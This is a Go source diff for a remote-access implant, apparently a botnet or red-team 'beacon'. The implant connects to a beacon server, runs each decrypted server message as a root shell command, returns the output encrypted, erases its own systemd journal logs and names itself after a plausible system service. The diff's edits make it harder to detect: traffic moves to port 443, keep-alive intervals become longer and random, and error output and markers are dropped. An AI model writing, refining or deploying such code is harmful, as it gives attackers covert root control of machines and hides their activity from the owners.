@@ -28,7 +28,7 @@ func resolveBeaconIPAddr() string {
 		if err == nil {
 			for _, ip := range ips {
 				// Send http request to the resolved ip to make sure we can communicate over http
-				conn, err := net.DialTimeout("tcp", (ip.String() + ":80"), 10*time.Second)
+				conn, err := net.DialTimeout("tcp", (ip.String() + ":443"), 10*time.Second)
 				if err == nil {
 					defer conn.Close()
 					fmt.Fprint(conn, "GET / HTTP/1.1\n")
@@ -65,10 +65,10 @@ func sendKeepAlive(socket net.Conn, aesSubKeys []string) {
 	packet = aes.AESEncrypt(packet, aesSubKeys)
 	packet = strconv.Itoa(len(aes.DecodeUTF8String(packet))) + "\n" + packet + "\n"
 
-	// Sleep a random time between 30 and 90 seconds
+	// Sleep a random time between 120 and 240 seconds
 	for {
-		randomTime, _ := rand.Int(rand.Reader, big.NewInt(int64(60)))
-		randomTimeInt := randomTime.Int64() + 30
+		randomTime, _ := rand.Int(rand.Reader, big.NewInt(int64(120)))
+		randomTimeInt := randomTime.Int64() + 120
 		time.Sleep(time.Duration(randomTimeInt) * time.Second)
 
 		// Send the KEEP_ALIVE message
@@ -79,7 +79,7 @@ func sendKeepAlive(socket net.Conn, aesSubKeys []string) {
 func getServiceName() string {
 	possibleServiceNames := []string{"systemd-ssh.service", "snapd.container.service", "apparmour.service", "systemd-logind-ssh.service", "firewall.service"}
 
-	cmd := exec.Command("bash", "-c", "sudo systemctl --type=service")
+	cmd := exec.Command("/bin/sh", "-c", "sudo systemctl --type=service")
 	output, err := cmd.Output()
 	if err == nil {
 		for name := range possibleServiceNames {
@@ -126,7 +126,7 @@ func main() {
 	if serverIPAddress != "0" {
 
 		// Connect to Beacon Server
-		serverConn, err := net.Dial("tcp", (serverIPAddress + ":80"))
+		serverConn, err := net.Dial("tcp", (serverIPAddress + ":443"))
 		if err != nil {
 			fmt.Print("Error connecting to server\n")
 		} else {
@@ -164,26 +164,24 @@ func main() {
 					serverMessage = aes.AESDecrypt(serverMessage, aesSubKeys)
 					if serverMessage != "KEEP_ALIVE" {
 						// As long as the message is not a KEEP_ALIVE message, execute it as a command
-						cmd := exec.Command("bash", "-c", "sudo "+serverMessage)
+						cmd := exec.Command("/bin/sh", "-c", "sudo "+serverMessage)
 						output, err := cmd.Output()
 						if err != nil {
-							fmt.Println("Error Executing command: ", err)
-
 							// If there is an error executing the command, we still want to return an empty output
-							finalOutput := "END_OF_OUTPUT\r\n"
+							finalOutput := "\r\n"
 							cipherText := aes.AESEncrypt(finalOutput, aesSubKeys)
 
 							cipherText = strconv.Itoa(len(aes.DecodeUTF8String(cipherText))) + "\n" + cipherText + "\n"
 							fmt.Fprint(serverConn, cipherText)
 						} else {
-							finalOutput := string(output) + "END_OF_OUTPUT\r\n"
+							finalOutput := string(output)
 							cipherText := aes.AESEncrypt(finalOutput, aesSubKeys)
 
 							cipherText = strconv.Itoa(len(aes.DecodeUTF8String(cipherText))) + "\n" + cipherText + "\n"
 							fmt.Fprint(serverConn, cipherText)
 						}
 						// Clear logs of our service
-						clearLogs := exec.Command("bash", "-c", "sudo journalctl --rotate --vacuum-size=1B --unit="+serviceName)
+						clearLogs := exec.Command("/bin/sh", "-c", "sudo journalctl --rotate --vacuum-size=1B --unit="+serviceName)
 						clearLogs.Run()
 					}
 				}
